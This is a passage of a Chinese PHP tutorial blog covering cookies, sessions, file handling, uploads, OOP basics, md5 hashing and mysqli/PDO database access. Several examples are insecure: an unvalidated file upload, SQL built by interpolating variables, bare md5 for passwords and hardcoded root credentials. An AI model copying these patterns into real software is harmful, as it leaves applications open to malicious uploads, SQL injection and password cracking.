punctuation">;</span><span class="token comment">//返回时间戳</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$t</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Y-m-d-h:i:s"</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据时间戳返回时间</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Y-m-d-h:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="cookie与session"><a href="#cookie与session" class="headerlink" title="cookie与session"></a>cookie与session</h1><h3 id="cookie原理（概念）"><a href="#cookie原理（概念）" class="headerlink" title="cookie原理（概念）"></a>cookie原理（概念）</h3><p><strong>服务器设置到浏览器setcookie</strong></p><p><strong>浏览器自动发送</strong></p><p><strong>作用域</strong></p><p><strong>过期时间</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">setcookie(name, value, expire, path, domain);<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$expire</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"yln"</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>.....    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 设置 cookie 过期时间为过去 1 小时</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="session是什么"><a href="#session是什么" class="headerlink" title="session是什么"></a>session是什么</h3><p><strong>原理，利用cookie令牌</strong></p><p><strong>与cookie区别</strong></p><p><strong>保存在服务器</strong></p><p><strong>如何判断用户状态</strong></p><h3 id="如何操作session"><a href="#如何操作session" class="headerlink" title="如何操作session"></a>如何操作session</h3><p><strong>启动</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'getmysql.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> vip<span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>写</strong></p><p><strong>读</strong></p><p><strong>清除一个值</strong></p><p><strong>销毁整个session</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'getmysql.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> vip<span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">233</span><span class="token punctuation">;</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//本页面不会销毁</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接销毁</span><span class="token comment">//</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h1><p>打开关闭文件</p><p><strong>读文件</strong></p><p><strong>redfile</strong></p><p><strong>file</strong></p><p><strong>file_get_contents</strong></p><p>1．从文件中读取数据<br>    从文件中读取数据，可以读取一个字符、一行字串或整个文件，还可以读取<br>任意长度的字串。<br>1）读取整个文件：readfile()、file()和file_get_contents()<br><strong>（1）readfile()函数</strong><br>       readfile()函数用于读入一个文件并将其写入到输出缓冲，如果出现错误则<br>返回false。函数语法如下：<br>int readfile(string filename)<br>      使用readfile()函数，不需要打开/关闭文件，不需要echo/print等输出语<br>句，直接写出文件路径即可。<br><strong>（2）file()函数</strong><br>        file()函数也可以读取整个文件的内容，只是file()函数将文件内容按行存<br>放到数组中，包括换行符在内。如果失败则返回false。函数语法如下：<br>array file(string filename)<br><strong>（3）file_get_contents()函数</strong><br>      该函数将文件内容（filename）读入失一个字符串。如果有offset和maxlen参数，将在<br>参数offset所指定的位置开始读取长度为maxlen的内容。如果败，返回false。函数语法<br>如下：<br>string file_get_contents(string filename[,int offset[,int maxlen]])<br>该函数适用于二进制对象，是将整个文件的内容读入到一个字符串中的首选方式。 </p><p>写文件fwrite</p><p><img src="/2021/04/19/PHP/image-20210525155645686.png" alt="image-20210525155645686" loading="lazy"></p><p><strong>文件和目录</strong></p><p><strong>scandir</strong></p><p>数组方式列出 images 目录中的文件和目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">p<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/images/"</span><span class="token punctuation">;</span><span class="token comment">// Sort in ascending order - this is default</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Sort in descending order，降序</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>is_dir</strong></p><p>is_dir() 函数检查指定的文件是否是一个目录。</p><p>如果目录存在，该函数返回 TRUE。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"images"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$file</span></span> is a directory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$file</span></span> is not a directory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何上传文件</strong></p><p>在表单需要二进制数据时，比如文件内容，请使用 “<strong>multipart/form-data</strong>“。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>//upload_file.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>            <span class="token comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"文件存储在: "</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>大多与JAVA一样</p><p><strong>定义类需要在一个PHP区块中</strong></p><p><strong>析构函数的特殊性</strong></p><p>常量</p><p>静态方法</p><p>静态函数</p><p><strong>$this和 ： :</strong></p><p><strong>parent/self/类名</strong></p><p>对象成员访问符号</p><p><strong>魔术方法</strong></p><p><strong>_get/ _set</strong></p><p><strong>_call</strong></p><p>三大特点：封装性，继承性，多态性</p><p>定义类需要在一个PHP区块中</p><p>析构函数的特殊性：（void __destruct(void)）</p><ul><li>PHP使用一种“垃圾回收”机制，自动清理不再使用的对象，析构函数会自动被调用，释放内存。</li><li>对象被销毁时被调用（和构造方法相反），作用释放内存。</li></ul><p>$this-&gt;和::</p><ul><li>$this-&gt;表示实例化后调用具体对象</li><li>::用来直接调用类中的属性或方法，没有实例化</li></ul><p>使用::的格式：关键字::变量名/常量名/方法名，这里的关键字：</p><ul><li>parent：可以调用父类中的成员变量、常量，成员方法</li><li>self：可以调用当前类中的静态成员和常量</li><li>类名：可以调用该类的变量、常量、方法</li></ul><p>对象成员访问符号</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">-&gt; 是对象成员访问符号 &#x2F;&#x2F;区分 &#x3D;&gt; 是数组成员访问符号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>魔术方法：*get/*set;_call</p><p>php面向对象中的public protected private 的含义，以及final关键字的含义</p><ul><li><p>public：公开的，可以在程序的任何位置（类内、类外）被其它类和对象调用</p></li><li><p>private：只能在所属类的内部被调用和修改，不可以在类外被访问</p></li><li><p>protected：可在本类和子类被调用，其它地方不可被调用</p></li><li><p>final：被final修饰的类不能被继承，修饰的方法不能重写也不能覆盖</p></li></ul><h1 id="PHP加密"><a href="#PHP加密" class="headerlink" title="PHP加密"></a>PHP加密</h1><p>crypt</p><p>md5</p><p>sha1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="PHP操作数据库"><a href="#PHP操作数据库" class="headerlink" title="PHP操作数据库"></a>PHP操作数据库</h1><h3 id="mysql基础"><a href="#mysql基础" class="headerlink" title="mysql基础"></a>mysql基础</h3><p>安装</p><p>访问</p><p>WEB客户端</p><h2 id="传统方式操作数据库"><a href="#传统方式操作数据库" class="headerlink" title="传统方式操作数据库"></a>传统方式操作数据库</h2><p><strong>连接</strong></p><p><strong>执行SQL</strong></p><p><strong>结果集操作</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"ylndb"</span><span class="token punctuation">;</span><span class="token comment">// 创建连接</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM user"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以用这个数组判断重复，这个是一维数组</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO user (tou, userid, username,password,name,sex,telephone,qq,email,birthday)        VALUES ('<span class="token interpolation"><span class="token variable">$tou</span></span>', '<span class="token interpolation"><span class="token variable">$userid</span></span>', '<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$password</span></span>','<span class="token interpolation"><span class="token variable">$name</span></span>','<span class="token interpolation"><span class="token variable">$sex</span></span>','<span class="token interpolation"><span class="token variable">$telephone</span></span>','<span class="token interpolation"><span class="token variable">$qq</span></span>','<span class="token interpolation"><span class="token variable">$email</span></span>','<span class="token interpolation"><span class="token variable">$birthday</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PDO方式操作数据库"><a href="#PDO方式操作数据库" class="headerlink" title="PDO方式操作数据库"></a>PDO方式操作数据库</h3><p><strong>PDO连接数据库以及DSN</strong></p><p><strong>执行SQL-&gt;参数绑定</strong></p><p><strong>结果集操作</strong></p><p>错误处理</p><p>事务处理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dbservername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$dbusername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpassword</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"ylndb"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"mysql:host=<span class="token interpolation"><span class="token variable">$dbservername</span></span>;dbname=<span class="token interpolation"><span class="token variable">$dbname</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$dbusername</span><span class="token punctuation">,</span> <span class="token variable">$dbpassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"select * from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置结果集为数组</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setFetchMode</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以用这个数组判断重复,这个是二维数组</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"mysql:host=<span class="token interpolation"><span class="token variable">$dbservername</span></span>;dbname=<span class="token interpolation"><span class="token variable">$dbname</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$dbusername</span><span class="token punctuation">,</span> <span class="token variable">$dbpassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置 PDO 错误模式，用于抛出异常</span>    <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO user (tou, userid, username,password,name,sex,telephone,qq,email,birthday)        VALUES ('<span class="token interpolation"><span class="token variable">$tou</span></span>', '<span class="token interpolation"><span class="token variable">$userid</span></span>', '<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$password</span></span>','<span class="token interpolation"><span class="token variable">$name</span></span>','<span class="token interpolation"><span class="token variable">$sex</span></span>','<span class="token interpolation"><span class="token variable">$telephone</span></span>','<span class="token interpolation"><span class="token variable">$qq</span></span>','<span class="token interpolation"><span class="token variable">$email</span></span>','<span class="token interpolation"><span class="token variable">$birthday</span></span>')"</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 exec() ，没有结果返回</span>    <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"注册成功"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&lt;br>"</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="一小段代码"><a href="#一小段代码" class="headerlink" title="一小段代码"></a>一小段代码</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">index.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/from-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>//二进制传输    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass<span 